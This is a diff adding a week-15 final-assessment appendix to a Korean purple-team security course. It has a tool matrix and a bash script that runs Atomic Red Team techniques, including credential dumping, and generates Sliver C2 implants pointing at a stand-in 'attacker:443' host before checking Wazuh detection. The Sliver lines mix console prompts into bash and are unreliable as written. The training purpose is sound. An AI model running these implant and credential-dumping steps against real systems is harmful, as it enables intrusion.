@@ -698,3 +698,120 @@ graph LR
 
 **학생 액션**: 본인 사후분석 보고서 작성.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 15 종합 평가)
+
+본 15주차는 1-14주차 모든 도구를 통합 운영하는 종합 평가.
+
+### 통합 도구 매트릭스 (60+ OSS, course12 advanced 전 영역)
+
+| Layer | 핵심 OSS 도구 |
+|-------|--------------|
+| APT 시뮬 | CALDERA · Atomic Red Team · Stratus · InfectionMonkey |
+| C2 | Sliver · Mythic · Havoc · Empire · pwncat-cs |
+| 다단계 침투 | Metasploit · msfvenom · sliver multi-stage |
+| 측면 이동 | Impacket · NetExec · evil-winrm · BloodHound · pypykatz · kerbrute |
+| 안티포렌식 | shred · chattr · timestomp · LD_PRELOAD · iodine · steghide · age |
+| 고급 탐지 | Suricata Lua · Wazuh decoder · Sigma · chainsaw · hayabusa · yara-x · vector.dev |
+| 위협 헌팅 | Velociraptor · kestrel-lang · osquery + Fleet · LLM augmented |
+| 포렌식 | Volatility 3 · LiME · Sleuth Kit · Plaso · tshark · Zeek · Brim |
+| SOAR | Shuffle · TheHive 5 · Cortex · n8n · StackStorm |
+| 내부자 | Wazuh user-behavior · Falco user activity · MaxMind GeoIP |
+| 공급망 | sigstore · cosign · syft · grype · modelscan · safetensors · YARA · guarddog |
+| 퍼플팀 | Atomic + CALDERA + DeTT&CT + Sigma + cron 자동화 |
+
+### 종합 평가 시나리오
+
+```bash
+#!/bin/bash
+# /usr/local/bin/course12-master-eval.sh
+
+TS=$(date +%Y%m%d-%H%M)
+DIR=/var/log/course12-master/$TS
+mkdir -p $DIR
+
+# === Phase 1: APT 시뮬 (CALDERA Custom-banking-apt) ===
+OPERATION_ID=$(curl -X POST http://localhost:8888/api/v2/operations \
+    -H "KEY: ADMIN123" \
+    -d '{"name":"Master-Eval","adversary_id":"custom-banking-apt-2026"}' | jq -r .id)
+
+# 또는 Atomic 기반 종합
+for t in T1078 T1059.001 T1547.001 T1003.001 T1021.004 T1548.003 \
+         T1041 T1027 T1070.004 T1090 T1071.004; do
+    sudo invoke run-atomic-test $t
+    sleep 30
+done
+
+# === Phase 2: C2 채널 검증 (sliver 모든 transport) ===
+for transport in mtls https dns; do
+    sliver-server &
+    sliver > $transport --lhost attacker --lport 443
+    sliver > generate --$transport attacker:443 --save /tmp/sliver-$transport
+    # Blue 가 탐지하는지?
+    sudo jq -r ".rule.description" /var/ossec/logs/alerts/alerts.json | grep -i sliver
+done
+
+# === Phase 3: Forensic 능력 (Volatility + Sleuth Kit) ===
+sudo insmod ~/lime/lime-$(uname -r).ko 'path=/forensic/mem.lime format=lime'
+vol -f /forensic/mem.lime linux.pslist > $DIR/forensic-pslist.txt
+vol -f /forensic/mem.lime linux.malfind > $DIR/forensic-malfind.txt
+vol -f /forensic/mem.lime linux.bash > $DIR/forensic-bash-mem.txt
+
+# === Phase 4: SOAR (Shuffle workflow) ===
+# Webhook 트리거 → 자동 IR 흐름 검증
+curl -X POST http://shuffle:5001/api/v1/hooks/wazuh-alert \
+    -d '{"rule":{"level":13},"data":{"srcip":"1.2.3.4"}}'
+
+# === Phase 5: 공급망 (sbom + sign + verify) ===
+syft my-agent:latest -o spdx-json > $DIR/sbom.json
+grype my-agent:latest --severity-threshold high
+cosign verify --key cosign.pub my-agent:latest > $DIR/cosign-verify.txt
+
+# === Phase 6: Purple Team Cycle ===
+/usr/local/bin/purple-cycle.sh > $DIR/purple-result.txt
+
+# === Phase 7: 종합 보고서 ===
+pandoc $DIR/purple-result.txt -o $DIR/master-report.pdf \
+    --pdf-engine=xelatex -V mainfont=NanumGothic
+```
+
+### 평가 등급
+
+| 등급 | APT 시뮬 success | 탐지율 | C2 우회 | Forensic | Coverage (DeTT&CT) | Supply chain |
+|------|------------------|--------|---------|----------|--------------------|--------------|
+| A | 모든 phase 자동 | > 90% | mTLS+DNS | 메모리+디스크 | > 90% | 0 critical |
+| B | 8+ phase | > 75% | HTTPS | 메모리만 | > 75% | < 3 high |
+| C | 5+ phase | > 60% | HTTP | 디스크만 | > 50% | < 10 medium |
+| F | < 5 phase | < 60% | 안 됨 | 없음 | < 50% | critical 존재 |
+
+### Course12 Advanced 12 layer 종합
+
+```
+1. APT 시뮬 (CALDERA / Atomic / Stratus)
+   ↓
+2. 다단계 침투 (Metasploit → Sliver chain)
+   ↓
+3. C2 채널 (mTLS / HTTPS / DNS / SMB)
+   ↓
+4. 측면 이동 (Impacket / NetExec / BloodHound)
+   ↓
+5. 안티포렌식 (shred / chattr / iodine / age)
+   ↓
+6. 고급 탐지 (Sigma + chainsaw + hayabusa + Suricata Lua)
+   ↓
+7. 위협 헌팅 (Velociraptor + kestrel-lang + osquery)
+   ↓
+8. 포렌식 (Volatility 3 + Sleuth Kit + Plaso + tshark + Zeek)
+   ↓
+9. SOAR (Shuffle + TheHive + Cortex)
+   ↓
+10. 내부자 (Wazuh UBA + Falco)
+   ↓
+11. 공급망 (cosign + syft + grype + modelscan)
+   ↓
+12. Purple Team (Atomic + DeTT&CT + 자동 cycle)
+```
+
+학생은 본 15주차 종합 평가에서 **OSS 60+ 도구 통합 운용** 으로 advanced 공방전의 12 layer 사이클을 직접 구축·운영·평가한다.
